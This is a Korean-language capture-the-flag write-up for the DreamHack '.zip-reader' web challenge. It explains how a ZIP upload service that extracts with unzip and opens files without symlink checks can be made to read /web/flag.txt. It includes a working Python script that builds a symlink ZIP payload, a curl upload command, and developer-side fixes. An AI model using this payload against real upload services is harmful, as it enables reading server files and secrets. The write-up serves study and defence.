---
title: "[DreamHack] .zip-reader 풀이"
date: 2026-07-16 10:39:13 +0900
categories: [study, dreamhack]
tags: [dreamhack, wargame, web, zip, symlink, arbitrary-file-read]
study_collection: "드림핵 워게임"
study_level: "Bronze"
study_problem: ".zip-reader"
study_area: "WEB"
toc: true
comments: false
---

## 1. 문제 요약

이 웹사이트는 사용자가 ZIP 파일을 업로드하면 압축을 해제한 뒤, ZIP 안에 있던 파일들의 내용을 읽어 화면에 출력한다.

동작 순서는 다음과 같다.

1. 사용자가 `.zip` 파일을 업로드한다.
2. 서버가 업로드한 파일을 임시 디렉터리에 저장한다.
3. Linux의 `unzip` 명령어로 압축을 해제한다.
4. 압축에서 나온 파일들을 `os.walk()`로 찾는다.
5. 각 파일을 `open()`으로 열어 앞부분 1024바이트를 출력한다.

이 과정에서 압축에서 나온 파일이 **심볼릭 링크(Symbolic Link)** 인지 확인하지 않기 때문에, 서버 내부의 파일을 읽을 수 있다.

취약점 유형은 다음과 같다.

> ZIP 심볼릭 링크를 이용한 임의 파일 읽기(Arbitrary File Read)

---

## 2. 플래그 파일의 경로 찾기

먼저 `Dockerfile`을 살펴본다.

```dockerfile
FROM python:3.11-slim

RUN apt-get update && \
    apt-get install -y unzip && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /web

COPY . .

RUN pip install --no-cache-dir flask

EXPOSE 5000

CMD ["python", "app.py"]
```

다음 두 줄이 중요하다.

```dockerfile
WORKDIR /web
COPY . .
```

`WORKDIR /web`은 컨테이너의 작업 디렉터리를 `/web`으로 설정한다는 뜻이다.

이후 `COPY . .`가 현재 문제 폴더의 파일들을 작업 디렉터리로 복사한다. 문제 폴더에는 `flag.txt`가 있으므로 컨테이너 내부의 플래그 경로는 다음과 같다.

```text
/web/flag.txt
```

따라서 최종 목표는 웹 애플리케이션이 `/web/flag.txt`를 읽게 만드는 것이다.

---

## 3. 웹 애플리케이션 분석

핵심 코드는 `app.py`에 있다.

### 3.1 업로드 파일 검사

```python
if file and file.filename.endswith('.zip'):
```

업로드한 파일 이름이 `.zip`으로 끝나는지만 검사한다. 따라서 공격 파일의 이름도 `payload.zip`처럼 `.zip`으로 끝나야 한다.

### 3.2 파일 저장 및 압축 해제

```python
uid = str(uuid.uuid4())
extract_path = os.path.join('/tmp/zip_uploads', uid)
os.makedirs(extract_path, exist_ok=True)

zip_path = os.path.join(extract_path, "uploaded.zip")
file.save(zip_path)
```

서버는 UUID를 생성하고 업로드한 ZIP을 임시 디렉터리에 저장한다. 실제 경로는 대략 다음과 같은 형태다.

```text
/tmp/zip_uploads/랜덤-UUID/uploaded.zip
```

그다음 `unzip` 명령어로 압축을 해제한다.

```python
subprocess.run(
    ['unzip', '-q', zip_path, '-d', extract_path],
    check=True
)
```

Linux의 `unzip`은 ZIP에 Unix 심볼릭 링크 정보가 들어 있으면 해당 링크를 복원할 수 있다.

### 3.3 압축에서 나온 파일 읽기

```python
for root, dirs, files in os.walk(extract_path):
    for name in files:
        if name == 'uploaded.zip':
            continue

        filepath = os.path.join(root, name)

        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read(1024)
                result_text += f"[{name}]\n{content}\n\n"
        except Exception:
            result_text += f"[{name}] Could not read file.\n\n"
```

서버는 압축에서 나온 파일들을 찾은 후 `open(filepath)`로 내용을 읽는다.

그러나 다음과 같은 검사가 없다.

- 파일이 심볼릭 링크인지 검사하지 않는다.
- 파일의 실제 경로가 압축 해제 디렉터리 내부인지 검사하지 않는다.
- 링크가 `/web/flag.txt` 같은 중요 파일을 가리키는지 검사하지 않는다.

따라서 `/web/flag.txt`를 가리키는 심볼릭 링크를 ZIP 안에 넣으면 서버가 그 링크를 따라가 플래그를 읽는다.

---

## 4. 심볼릭 링크란?

심볼릭 링크는 다른 파일이나 디렉터리를 가리키는 특별한 파일이다.

Linux에서 다음 명령을 실행한다고 생각해 보자.

```bash
ln -s /web/flag.txt read_flag
```

그러면 다음과 같은 링크가 만들어진다.

```text
read_flag -> /web/flag.txt
```

이제 프로그램이 `read_flag`를 열면 운영체제는 링크를 따라가 실제 `/web/flag.txt`를 열어준다.

```python
with open("read_flag", "r") as f:
    print(f.read())
```

위 코드는 결과적으로 다음 코드와 같은 파일을 읽는다.

```python
with open("/web/flag.txt", "r") as f:
    print(f.read())
```

ZIP 안에 다음 링크를 넣는 것이 이번 공격의 핵심이다.

```text
read_flag -> /web/flag.txt
```

---

## 5. 공격 과정

전체 공격 흐름은 다음과 같다.

```text
payload.zip 업로드
        ↓
서버가 unzip으로 압축 해제
        ↓
read_flag -> /web/flag.txt 링크 생성
        ↓
os.walk()가 read_flag를 파일로 발견
        ↓
서버가 open(read_flag) 실행
        ↓
운영체제가 링크를 따라 /web/flag.txt를 열어줌
        ↓
플래그가 웹페이지에 출력됨
```

---

## 6. 공격용 ZIP 만들기

Windows의 일반 압축 프로그램으로 ZIP을 만들면 Unix 심볼릭 링크 정보가 사라질 수 있다. 따라서 Python의 `zipfile` 모듈을 이용한다.

다음 코드를 `payload.py`로 저장한다.

```python
import stat
import zipfile

# ZIP 안에서 사용할 엔트리 이름
info = zipfile.ZipInfo("read_flag")

# 엔트리가 Unix 시스템에서 만들어진 것으로 표시
info.create_system = 3

# Unix 파일 종류를 심볼릭 링크로 지정
info.external_attr = (stat.S_IFLNK | 0o777) << 16

with zipfile.ZipFile("payload.zip", "w") as zf:
    # 심볼릭 링크가 가리킬 서버 내부 경로
    zf.writestr(info, "/web/flag.txt")

print("payload.zip created")
```

### 6.1 `ZipInfo("read_flag")`

```python
info = zipfile.ZipInfo("read_flag")
```

ZIP 안에 `read_flag`라는 엔트리를 만든다. 압축이 풀리면 이 엔트리가 파일처럼 나타난다.

### 6.2 `create_system = 3`

```python
info.create_system = 3
```

ZIP 엔트리가 Unix 시스템에서 생성된 것처럼 표시한다.

ZIP 포맷은 파일 이름과 내용뿐만 아니라 파일 권한과 파일 종류도 저장할 수 있다. 심볼릭 링크는 Unix 파일 종류이므로 Unix 속성을 사용하도록 지정해야 한다.

```text
0 = Windows/DOS
3 = Unix
```

### 6.3 `external_attr`

```python
info.external_attr = (stat.S_IFLNK | 0o777) << 16
```

`stat.S_IFLNK`는 이 엔트리의 종류를 심볼릭 링크로 지정한다.

`0o777`은 Unix 권한 정보다. ZIP 포맷은 Unix 파일 모드를 상위 16비트에 저장하므로 `<< 16`을 사용한다.

이 설정으로 `read_flag`는 일반 파일이 아니라 Unix 심볼릭 링크가 된다.

### 6.4 링크 대상 저장

```python
zf.writestr(info, "/web/flag.txt")
```

일반 파일에서는 두 번째 인자가 파일 내용이지만, 심볼릭 링크 엔트리에서는 이 문자열이 링크 대상 경로가 된다.

결과적으로 압축 해제 시 다음 링크가 만들어진다.

```text
read_flag -> /web/flag.txt
```

---

## 7. 페이로드 생성하기

PowerShell을 열고 문제 폴더로 이동한다.

```powershell
cd ".\WEB\Bronze\.zip-reader"
```

스크립트를 실행한다.

```powershell
python .\payload.py
```

Python 명령이 동작하지 않으면 다음 명령도 시도할 수 있다.

```powershell
py .\payload.py
```

정상적으로 실행되면 다음 메시지가 출력된다.

```text
payload.zip created
```

생성된 ZIP을 확인한다.

```powershell
Get-Item .\payload.zip
```

`payload.zip`의 크기가 약 129바이트로 매우 작을 수 있는데, 이는 정상이다. 플래그 내용 자체가 아니라 `/web/flag.txt`를 가리키는 링크 정보만 들어 있기 때문이다.

---

## 8. 페이로드가 정상인지 검증하기

다음 코드를 실행하면 ZIP 엔트리가 실제 심볼릭 링크인지 확인할 수 있다.

```python
import stat
import zipfile

with zipfile.ZipFile("payload.zip") as zf:
    for info in zf.infolist():
        mode = info.external_attr >> 16

        print("엔트리 이름:", info.filename)
        print("링크 대상:", zf.read(info).decode())
        print("생성 시스템:", info.create_system)
        print("Unix 모드:", oct(mode))
        print("심볼릭 링크:", stat.S_ISLNK(mode))
```

정상 결과는 다음과 같다.

```text
엔트리 이름: read_flag
링크 대상: /web/flag.txt
생성 시스템: 3
Unix 모드: 0o120777
심볼릭 링크: True
```

마지막 결과가 `True`라면 ZIP 엔트리가 정상적인 심볼릭 링크로 설정된 것이다.

---

## 9. 문제 서버에 업로드하기

생성된 `payload.zip`을 문제 사이트의 파일 업로드 기능으로 제출한다.

성공하면 다음과 비슷한 결과가 출력된다.

```text
[read_flag]
DH{실제_플래그}
```

`read_flag`는 우리가 만든 ZIP 엔트리의 이름이고, 그 아래 내용은 링크가 가리킨 `/web/flag.txt`의 내용이다.

웹 브라우저 대신 `curl`을 사용할 수도 있다.

```bash
curl -s -F "file=@payload.zip;filename=payload.zip" http://문제주소/
```

예를 들어 문제 주소가 `http://host3.dreamhack.games:12345`라면 다음과 같이 요청한다.

```bash
curl -s \
  -F "file=@payload.zip;filename=payload.zip" \
  http://host3.dreamhack.games:12345/
```

---

## 10. 일반 텍스트 파일로는 왜 공격할 수 없을까?

ZIP 안에 일반 파일을 만들고 그 안에 다음 문자열을 저장한다고 생각해 보자.

```text
/web/flag.txt
```

서버가 이 파일을 열면 단순히 `/web/flag.txt`라는 글자만 출력된다. 운영체제는 일반 파일 안의 문자열을 자동으로 다른 파일의 경로로 해석하지 않는다.

반면 심볼릭 링크는 운영체제 수준에서 다른 파일을 가리킨다.

```text
일반 파일:
파일 안에 "/web/flag.txt"라는 글자가 들어 있음

심볼릭 링크:
파일 자체가 /web/flag.txt를 가리킴
```

따라서 ZIP 엔트리의 종류를 반드시 심볼릭 링크로 지정해야 한다.

---

## 11. Zip Slip과의 차이

ZIP 문제에서 자주 등장하는 공격으로 Zip Slip이 있다.

예를 들어 ZIP 안에 다음 이름의 파일을 넣는 방식이다.

```text
../../../../web/some-file
```

이 공격은 `../`를 이용해 압축 해제 디렉터리 밖에 파일을 생성하거나 덮어쓰려고 시도한다.

하지만 Linux의 `unzip`은 일반적으로 위험한 `../` 경로를 경고하거나 제거한다. 또한 이번 문제의 목표는 특정 위치에 파일을 쓰는 것이 아니라 이미 존재하는 `flag.txt`를 읽는 것이다.

이번 문제에서는 압축 해제 폴더 안에 심볼릭 링크를 만들고, 서버가 그 링크를 열게 만드는 방식이 코드 구조에 더 정확하게 맞는다.

```text
Zip Slip:
압축 해제 디렉터리 밖에 파일을 쓰려고 시도

심볼릭 링크 공격:
압축 해제 디렉터리 안에 링크를 만들고 외부 파일을 읽음
```

---

## 12. 문제 해결이 안 될 때 확인할 내용

### 12.1 ZIP 파일이 보이지 않는 경우

현재 문제 폴더에서 다음 상대경로를 확인한다.

```text
.\payload.zip
```

### 12.2 ZIP 파일 크기가 너무 작은 경우

약 129바이트여도 정상이다. ZIP 안에는 플래그 자체가 아니라 다음 링크 정보만 들어 있다.

```text
read_flag -> /web/flag.txt
```

### 12.3 올바른 ZIP이 아니라는 오류가 나오는 경우

업로드하는 파일 이름이 정확히 `.zip`으로 끝나는지 확인한다.

```text
payload.zip       정상
payload.zip.txt   실패
payload           실패
```

Windows가 확장자를 숨기고 있다면 실제 파일 이름이 `payload.zip.txt`일 수도 있다.

### 12.4 `Could not read file`이 출력되는 경우

다음을 확인한다.

1. ZIP 엔트리가 실제 심볼릭 링크인지 확인한다.
2. 링크 대상이 정확히 `/web/flag.txt`인지 확인한다.
3. Python 스크립트로 만든 ZIP을 일반 압축 프로그램으로 다시 압축하지 않았는지 확인한다.
4. ZIP을 풀어서 나온 파일을 다시 압축하지 않았는지 확인한다.

일반 압축 프로그램으로 ZIP을 다시 만들면 Unix 심볼릭 링크 속성이 사라질 수 있다. Python 스크립트가 만든 `payload.zip`을 그대로 업로드해야 한다.

---

## 13. 개발자 입장에서 취약점 막기

압축에서 나온 파일을 읽기 전에 심볼릭 링크인지 확인해야 한다.

```python
if os.path.islink(filepath):
    continue
```

파일의 실제 경로가 압축 해제 디렉터리 내부에 있는지도 확인해야 한다.

```python
base_path = os.path.realpath(extract_path)
real_path = os.path.realpath(filepath)

if os.path.commonpath([base_path, real_path]) != base_path:
    continue
```

더 안전한 방법은 압축을 풀기 전에 ZIP의 모든 엔트리를 검사하는 것이다.

- `../`가 포함된 경로를 거부한다.
- 절대경로를 거부한다.
- 심볼릭 링크 엔트리를 거부한다.
- 압축 해제 후 실제 경로가 지정된 디렉터리 내부인지 확인한다.

---

## 14. 최종 정리

이 문제는 다음과 같이 해결할 수 있다.

1. `Dockerfile`을 보고 플래그 경로가 `/web/flag.txt`임을 확인한다.
2. `app.py`가 압축에서 나온 심볼릭 링크를 검사하지 않는다는 점을 찾는다.
3. `/web/flag.txt`를 가리키는 `read_flag` 심볼릭 링크를 ZIP 엔트리로 만든다.
4. 생성된 `payload.zip`을 문제 서버에 업로드한다.
5. 서버가 `read_flag`를 열면서 `/web/flag.txt`의 내용을 출력한다.

핵심 취약점은 다음 한 문장으로 정리할 수 있다.

> 서버가 ZIP에서 복원된 심볼릭 링크를 검증하지 않고 `open()`으로 열기 때문에 서버 내부의 `/web/flag.txt`를 읽을 수 있다.
